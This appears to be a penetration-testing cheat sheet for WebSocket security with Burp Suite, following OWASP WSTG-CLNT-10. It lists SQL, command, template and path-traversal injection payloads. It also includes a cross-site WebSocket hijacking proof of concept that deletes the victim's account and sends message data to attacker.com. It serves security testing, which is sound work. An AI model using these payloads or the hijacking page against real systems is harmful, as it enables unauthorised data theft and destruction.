title: Burp WebSockets — WSTG-CLNT-10: Injection, CSRF, Auth Testing
body: WebSockets establish a persistent bidirectional connection — same vulnerabilities as HTTP (SQLi, XSS, CMDi, SSTI, mass assignment) but different transport. Burp captures all WebSocket messages in Proxy -> WebSockets History and sends them to Repeater/Intruder just like HTTP. Key differences: no CSRF protection by default (origin-only), individual messages often not re-authenticated, and ws:// is unencrypted.
cmd:
# ══ ⭐ WEBSOCKET SECURITY TESTING — WSTG-CLNT-10 ════════════════════
# WebSockets = persistent bidirectional connection. Same bugs, different transport.
# Burp intercepts WebSocket messages in Proxy -> WebSockets History (separate tab).

# ══ SETUP — MAKE SURE BURP CAPTURES WS ══════════════════════════════
# Proxy -> WebSockets History tab (next to HTTP History)
# All WS messages appear here automatically when proxied
# To intercept and modify: Proxy -> Options -> Intercept WebSockets messages

# ══ 1. IDENTIFY WEBSOCKET ENDPOINTS ═════════════════════════════════
# Browser DevTools -> Network -> WS filter
# Look for: ws:// or wss:// connections in the Network tab
# In Burp HTTP History: look for 101 Switching Protocols responses
#   -> the URL is the WebSocket endpoint

# ══ 2. INJECTION TESTING — same bugs, different transport ═══════════
# Every WebSocket message is an input. In Burp WebSockets History:
# Right-click a message -> "Send to Repeater" (WS Repeater)
# Or: right-click -> "Send to Intruder"
# The Repeater for WS lets you send arbitrary messages and see responses
#
# Test each message field with injection payloads:
# SQLi:        {"action":"search","query":"' OR 1=1-- -"}
# XSS:         {"message":"<script>alert(1)</script>"}
# CMDi:        {"host":"127.0.0.1;id"}
# SSTI:        {"template":"{{7*7}}"}
# Path trav:   {"file":"../../../etc/passwd"}
# Numbers:     {"amount":-1}  (negative values)
# In WS Repeater: modify the JSON -> "Send" -> observe the response message

# ══ 3. CSRF VIA WEBSOCKETS (no CSRF protection by default) ══════════
# WebSocket connections only check the Origin header for cross-origin protection.
# If origin isn't validated -> any website can open a WS connection to the victim app
# Test: check if the WS handshake (the 101 response) validates Origin:
#   In Burp: intercept the WS upgrade request -> change Origin header to https://attacker.com
#   If the connection succeeds -> CSRF via WS is possible
# PoC: attacker page opens a WS connection to victim -> sends messages as the victim
cat << 'EOF'
<script>
var ws = new WebSocket('wss://victim.com/chat');
ws.onopen = function() { ws.send('{"action":"deleteAccount"}'); };
ws.onmessage = function(e) { fetch('https://attacker.com/?data='+e.data); };
</script>
EOF

# ══ 4. AUTHENTICATION ON WS MESSAGES ════════════════════════════════
# WS connection authenticated via cookie (on the initial handshake HTTP request)
# But are INDIVIDUAL messages authenticated?
# Test: intercept a privileged action in WS -> replay it without the cookie
# Test: modify user ID in a message -> does server validate ownership?
# In Burp WS Repeater: send the same admin-action message with a different session

# ══ 5. UNENCRYPTED WS (ws:// vs wss://) ════════════════════════════
# ws:// = unencrypted = interceptable on the network (same risk as HTTP vs HTTPS)
# Check: does the app use ws:// anywhere? (DevTools -> Network -> WS)
# wss:// = TLS-encrypted (but still injectable on the application layer)

# ══ 6. MASS ASSIGNMENT VIA WS MESSAGES ══════════════════════════════
# The same mass assignment vulnerability (see burp_authn/burp_logic) exists in WS
# If the server processes JSON messages and sets object properties:
# {"action":"updateProfile","email":"x@y.com"}
# Try adding: {"action":"updateProfile","email":"x@y.com","admin":true,"role":"admin"}
warn: WebSocket CSRF is often missed because developers assume the initial handshake authentication protects all subsequent messages — it doesn't. Any cross-origin page can open a WS connection if Origin isn't validated on the handshake. Individual message authorization is a separate question from handshake authentication — a valid session cookie on the handshake doesn't mean each message is checked for ownership. Test both.
